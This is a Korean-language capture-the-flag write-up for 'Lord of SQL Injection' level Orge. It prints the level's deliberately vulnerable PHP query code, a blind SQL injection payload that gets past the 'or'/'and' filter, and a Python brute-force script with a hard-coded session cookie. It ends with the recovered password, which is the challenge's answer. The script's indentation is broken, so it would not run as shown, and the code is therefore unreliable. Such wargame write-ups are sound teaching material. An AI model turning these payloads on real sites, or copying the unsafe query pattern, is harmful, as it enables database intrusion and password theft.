# Lord of SQL Injection No.7 - Orge
## 문제 출제 의도
1. 'and'나 'or'을 사용하지 않고 Blind SQL을 할 수 있는지 확인한다.
## 소스 코드 분석
+ 소스코드
Orge의 소스코드는 다음과 같다.
    ~~~
    <?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
    $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    
    $_GET[pw] = addslashes($_GET[pw]); 
    $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
    highlight_file(__FILE__); 
    ?>
    ~~~
    - Get 방식으로 받은 문자열에 'prob _ . ( )중 하나라도 있다면 "No Hack~_~"이 출력되고 문제 풀이에 실패한다.
    - Get 방식으로 받은 문자열에 'or'나 'and'가 있다면 "HeHe"가 출력되고 문제 풀이에 실패한다.
    - 받은 pw 값과 GET방식으로 입력한 pw가 같다면 문제풀이에 성공한다.

## 문제 해결
- 추가 문자열
    비밀번호가 몇글자인지 알아내기 위해 URL 뒤에 다음과 같은 문자열을 추가 하여 확인한다.   
    ~~~
    ?pw=' || id='admin' %26%26 length(pw)=8-- -
    ~~~      
    - 이는 Hello admin을 출력하게 만들기 때문에 우리는 pw가 8자리인 것을 알 수 있다.
    - 이때 '&'는 인식 불가하기 때문에 이를 아스키 코드화 하여 %26으로 적어준다.
- 해결 코드
    - 위와 비슷한 방법으로 계속해서 URL을 조작하면 비밀번호를 유추해낼 수 있지만 코드를 작성해서 풀면 더욱 편하다.
    - 다음은 파이썬 코드이다.
    ~~~
    import urllib.request
    from urllib.parse import quote
    key = ""
    for i in range(1, 9):
    for j in range(32, 127):
        url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="
        data="' || id='admin'&& substr(pw,1,{})='{}'#".format(str(i), key + chr(j))
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header("User-Agent", "Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=5risr964i7sta3c1mgd3mphah1")

        res = urllib.request.urlopen(re)

    if str(res.read()).find("Hello admin") != -1:
        key += chr(j).lower()
        print(key)
        break
    print(key)
    ~~~
- 다음 코드를 실행하면 key=6c864dec이 출력된다.
- 6c864dec를 GET방식으로 입력하면 해결된다.
~~~
http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=6c864dec
~~~